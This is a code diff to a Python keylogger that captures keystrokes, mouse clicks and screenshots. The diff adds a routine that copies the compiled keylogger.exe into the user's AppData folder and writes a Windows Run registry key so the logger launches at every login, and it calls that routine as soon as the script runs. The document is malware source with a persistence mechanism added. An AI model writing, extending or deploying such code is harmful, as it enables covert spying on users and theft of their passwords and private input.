@@ -1,4 +1,9 @@
+import getpass
 import os
+import shutil
+import sys
+import winreg
+
 from PIL import Image
 import mss as mss
 from pynput import keyboard, mouse
@@ -28,7 +33,6 @@ lastThreeKeys = []
 countDelete = 0
 clicks_counter = 0
 imgPath = 'screenshot.jpg'
-
 
 def on_press(key):
     global lastThreeKeys, f
@@ -130,6 +134,21 @@ def on_click(x, y, button, pressed):
         except Exception as e:
             print(e)
 
+
+def copy_script():
+    USER_NAME = getpass.getuser()
+    src = 'dist\\keylogger.exe'
+    dst = r'C:\Users\%s\AppData' % USER_NAME
+    shutil.copy2(src, dst)
+    dst = 'C:\\Users\\"%s"\\AppData\\keylogger.exe' % USER_NAME  # name of script after making EXE
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                         r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
+                         winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, 'keylogger.exe', 0,
+                      winreg.REG_SZ, dst+'keylogger.exe')  # file_path is path of file after coping it
+
+
+copy_script()
 
 # Collect events of mouse clicks and keyboard keys
 with keyboard.Listener(on_press=on_press) as k_listener, \
